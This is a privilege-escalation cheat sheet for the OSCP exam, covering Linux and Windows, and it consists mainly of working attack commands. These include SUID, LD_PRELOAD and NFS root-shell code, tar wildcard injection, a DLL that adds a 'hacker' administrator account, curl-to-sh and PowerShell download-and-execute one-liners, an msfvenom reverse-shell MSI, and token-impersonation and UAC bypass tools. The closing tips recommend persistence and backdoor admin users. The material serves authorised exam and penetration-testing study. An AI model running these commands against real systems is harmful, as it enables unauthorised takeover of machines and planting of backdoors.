# Privilege Escalation Cheatsheet for OSCP

## Linux Privilege Escalation

### Initial Enumeration

#### System Information
```bash
# Operating System
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz

# Environment Variables
env
set

# Printers
lpstat -a
```

#### User Information
```bash
# Current User
id
whoami
groups

# All Users
cat /etc/passwd | cut -d: -f1
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

# Last Logged Users
last
lastlog

# Currently Logged Users
w
who
```

#### Network Information
```bash
# Network Configuration
ifconfig
ip a
ip route
route
arp -a

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Active Connections
netstat -antup
netstat -tunlp
ss -tunlp
```

#### Running Services
```bash
# Process List
ps aux
ps -ef
top

# Service Status
service --status-all
systemctl list-units --type=service
```

#### Installed Software
```bash
# Installed Packages
dpkg -l
rpm -qa
ls -la /usr/bin/
ls -la /sbin/

# Find Development Tools
find / -name gcc
find / -name cc
find / -name perl
find / -name python
find / -name python2
find / -name python3
```

### Automated Enumeration Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1 -i

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Privilege Escalation Vectors

#### Kernel Exploits
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4.0

# Compile exploit
gcc exploit.c -o exploit
```

#### Sudo Rights
```bash
# Check sudo permissions
sudo -l

# Abuse sudo rights
sudo program
sudo /bin/bash
sudo -s
```

#### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID binaries
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```

#### Capabilities
```bash
# List capabilities
getcap -r / 2>/dev/null

# Exploit capabilities
# Example: if python has cap_setuid capability
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Cron Jobs
```bash
# List cron jobs
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron
crontab -l

# Check for writable scripts in cron jobs
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
```

#### Writable Files and Directories
```bash
# Find writable files
find / -writable -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Find writable /etc files
find /etc -writable -type f 2>/dev/null
```

#### NFS Shares
```bash
# Check NFS exports
cat /etc/exports

# Check if no_root_squash option is enabled
# If yes, mount the share and create SUID binary
showmount -e target
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell
```

#### Path Hijacking
```bash
# Check PATH variable
echo $PATH

# Create malicious program in writable directory in PATH
cd /tmp
echo '#!/bin/bash' > ls
echo '/bin/bash' >> ls
chmod +x ls
export PATH=/tmp:$PATH
```

#### Wildcard Injection
```bash
# If a script uses wildcards with commands like tar, rsync, etc.
# Example for tar
cd /path/to/directory
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# Wait for tar command to run in cron
```

#### Library Hijacking
```bash
# Check for LD_PRELOAD in sudo
sudo -l | grep LD_PRELOAD

# If available, create malicious library
echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}' > /tmp/preload.c
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so program
```

#### Password Hunting
```bash
# Search for passwords in files
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
grep -r "password" /root/ 2>/dev/null

# Search for specific config files
find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null
```

#### SSH Keys
```bash
# Search for SSH keys
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null
```

#### Docker Group
```bash
# Check if user is in docker group
groups | grep docker

# If yes, get root shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Windows Privilege Escalation

### Initial Enumeration

#### System Information
```powershell
# Operating System
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname

# Environment Variables
set

# Installed Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Disk Information
wmic logicaldisk get caption,description,providername
```

#### User Information
```powershell
# Current User
whoami
whoami /priv
whoami /groups
net user %username%

# All Users
net user
net localgroup
net localgroup Administrators
```

#### Network Information
```powershell
# Network Configuration
ipconfig /all
route print
arp -A

# Active Connections
netstat -ano
```

#### Running Services
```powershell
# Process List
tasklist /SVC
tasklist /v
wmic process get caption,executablepath,commandline

# Service List
sc query
wmic service list brief
wmic service get name,displayname,pathname,startmode
```

#### Installed Software
```powershell
# Installed Applications
wmic product get name,version,vendor
reg query HKEY_LOCAL_MACHINE\SOFTWARE

# Program Files
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
```

### Automated Enumeration Tools

```powershell
# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerUp.ps1'); Invoke-AllChecks"

# JAWS
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/jaws-enum.ps1')"

# WinPEAS
.\winPEASany.exe

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe
```

### Privilege Escalation Vectors

#### Service Misconfigurations
```powershell
# Check service permissions
sc qc <servicename>
accesschk.exe -uwcqv "Authenticated Users" *

# Check service binary permissions
icacls "C:\Program Files\Vulnerable Service\service.exe"

# Exploit writable service binary
copy /y evil.exe "C:\Program Files\Vulnerable Service\service.exe"
sc stop <servicename>
sc start <servicename>
```

#### Unquoted Service Paths
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Exploit unquoted service path
# Example: C:\Program Files\Vulnerable Service\subdir\service.exe
# Create malicious executable at C:\Program Files\Vulnerable.exe
copy evil.exe "C:\Program Files\Vulnerable.exe"
sc stop <servicename>
sc start <servicename>
```

#### AlwaysInstallElevated
```powershell
# Check if AlwaysInstallElevated is enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are set to 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

#### Registry Autoruns
```powershell
# Check autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check for writable autorun executables
icacls "C:\Program Files\Autorun Program\program.exe"
```

#### Scheduled Tasks
```powershell
# List scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Check task binary permissions
icacls "C:\path\to\task\binary.exe"
```

#### DLL Hijacking
```powershell
# Find potential DLL hijacking targets
Process Monitor (procmon.exe) - Filter for "NAME NOT FOUND" and "PATH ENDS WITH .dll"

# Create malicious DLL
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker Password123! /add");
        system("cmd.exe /c net localgroup administrators hacker /add");
    }
    return TRUE;
}

# Compile DLL
x86_64-w64-mingw32-gcc -shared -o hijackme.dll hijackme.c
```

#### Token Impersonation
```powershell
# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv

# Exploit with JuicyPotato (Windows 10 1809 & Windows Server 2019 before patch)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user administrator Hacked123" -t *

# Exploit with PrintSpoofer (Windows 10 & Windows Server 2019)
.\PrintSpoofer.exe -i -c cmd
```

#### Stored Credentials
```powershell
# Check for stored credentials
cmdkey /list

# Use stored credentials
runas /savecred /user:admin cmd.exe

# Check for credentials in files
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* == *cred* == *vnc* == *.config*
```

#### Registry Passwords
```powershell
# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Common locations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

#### Kernel Exploits
```powershell
# Check Windows version and patches
systeminfo

# Search for kernel exploits
# Common exploits: MS16-032, MS15-051, MS14-058, etc.
```

#### UAC Bypass
```powershell
# Check UAC level
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Use UACMe or other bypass techniques
.\UACMe.exe 33
```

## OSCP Exam Tips for Privilege Escalation

1. **Start with Automated Tools**: Use tools like LinPEAS/WinPEAS for initial enumeration
   - They save time and catch common issues
   - Always verify findings manually

2. **Follow a Methodology**: Have a systematic approach
   - System information
   - User information
   - Network information
   - Running services
   - Installed software
   - Writable files/directories
   - Scheduled tasks/cron jobs
   - Kernel exploits

3. **Look for Quick Wins First**:
   - Sudo rights (Linux)
   - Kernel exploits
   - Unpatched services
   - Weak file permissions
   - Stored credentials

4. **Document Everything**: Take notes of all commands and findings
   - Screenshots of privilege escalation steps
   - Commands used for exploitation
   - Evidence of elevated privileges

5. **Be Patient and Thorough**: Privilege escalation often requires attention to detail
   - Read configuration files carefully
   - Check all user accounts
   - Look for unusual permissions

6. **Understand the Exploits**: Don't blindly run exploits
   - Understand how they work
   - Modify them if necessary
   - Be prepared with alternatives

7. **Transfer Files Efficiently**: Have multiple methods ready
   - Python HTTP server
   - Base64 encoding/decoding
   - PowerShell DownloadString
   - Netcat file transfer

8. **Maintain Access**: Once you have elevated privileges
   - Create additional admin/root users
   - Set up persistence mechanisms
   - Collect important information

9. **Time Management**: Don't spend too much time on one approach
   - If stuck, try a different vector
   - Return to basic enumeration if needed

10. **Practice, Practice, Practice**: Privilege escalation requires experience
    - Practice on vulnerable VMs
    - Try different techniques
    - Learn to recognize patterns
